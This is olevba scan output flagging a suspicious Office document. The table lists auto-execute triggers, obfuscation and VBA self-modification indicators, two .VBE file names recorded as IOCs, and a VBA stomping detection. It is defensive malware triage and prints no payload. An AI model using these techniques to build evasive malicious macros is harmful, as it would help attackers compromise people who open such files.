|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |AUTONEW             |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NVV.VBE             |Executable file name                         |
|IOC       |AVV.VBE             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

